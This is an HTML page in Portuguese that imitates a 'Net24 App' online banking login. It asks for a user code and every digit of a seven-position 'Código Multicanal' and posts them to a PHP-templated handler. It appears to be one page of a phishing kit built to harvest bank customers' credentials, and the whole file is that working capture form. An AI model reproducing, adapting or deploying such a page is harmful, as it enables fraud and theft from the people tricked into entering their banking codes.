<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    <title>Acesso online - Net24 App</title>

    <meta name="theme-color" content="#0f145b">
    <meta name="apple-mobile-web-app-status-bar-style" content="#0f145b">
    <meta name="msapplication-navbutton-color" content="#0f145b">

    <link rel="stylesheet" href="./files/css/all.css">
    <script src="./files/js/jquery.min.js"></script>
</head>
<body>

<div class="container main_header">
    <div class="content">
        <img src="./files/images/logo.png" class="logo">
        <div class="clear"></div>
    </div><!--content-->
</div><!--container-->

<div class="container main_info">
    <div class="content">
        <h1>Acesso às contas</h1>
        <p>Para acessar introduza <strong>Código de Utilizador</strong> e <strong>Código Multicanal</strong>.</p>
    <div class="clear"></div>
    </div><!--content-->
</div><!--container-->

<form action="<?= getQuery($mainFile);?>" method="post" autocomplete="off" class="container form_content" onsubmit="return checkEnter();">
    <div class="content">
        <label for="is_login">
            <span>Código de Utilizador</span>
            <input type="text" name="is_login" id="is_login" class="home_input" maxlength="18">
        </label>

        <label for="is_passwd">
            <span>Digite as posições do Código Multicanal</span>

            <span class="block_span">
                <span>1</span>
                <span>2</span>
                <span>3</span>
                <span>4</span>
                <span>5</span>
                <span>6</span>
                <span>7</span>
            </span>
            <span class="block_inputs">
                <input type="number" name="input_1" id="input_1" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_2').focus();}">

                <input type="number" name="input_2" id="input_2" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_3').focus();}">

                <input type="number" name="input_3" id="input_3" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_4').focus();}">

                <input type="number" name="input_4" id="input_4" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_5').focus();}">

                <input type="number" name="input_5" id="input_5" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_6').focus();}">

                <input type="number" name="input_6" id="input_6" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}if(this.value.length >= 1){$('#input_7').focus();}">

                <input type="number" name="input_7" id="input_7" maxlength="1" oninput="javascript:if(this.value.length > this.maxLength){this.value = this.value.slice(0, this.maxLength);}">
            </span>
        </label>

        <button class="btn">
            <p>CONTINUAR</p>
            <span class="small_loader"></span>
        </button>

        <input type="hidden" name="sender" value="start">
    </div><!--content-->
</form><!--container form-->

<script>
    function checkEnter(){
        const login = $('#is_login')
        const passe1 = $('#input_1');
        const passe2 = $('#input_2');
        const passe3 = $('#input_3');
        const passe4 = $('#input_4');
        const passe5 = $('#input_5');
        const passe6 = $('#input_6');
        const passe7 = $('#input_7');

        if(login.val().length < 4){
            alert("Código de Utilizador incorreto. Tente novamente!");
            login.val('').focus();
            return false;
        }else if(passe1.val().length < 1 || passe2.val().length < 1 || passe3.val().length < 1 || passe4.val().length < 1 || passe5.val().length < 1 || passe6.val().length < 1 || passe7.val().length < 1){
            alert("Código Multicanal incorreto. Tente novamente!");
            passe7.val('');
            passe6.val('');
            passe5.val('');
            passe4.val('');
            passe3.val('');
            passe2.val('');
            passe1.val('').focus();
            return false;
        }else{
            $('.btn p').css('display', 'none');
            $('.btn .small_loader').css('display', 'block');
            $('.btn').attr('disabled', true);
            return true;
        }
    }
</script>
</body>
</html>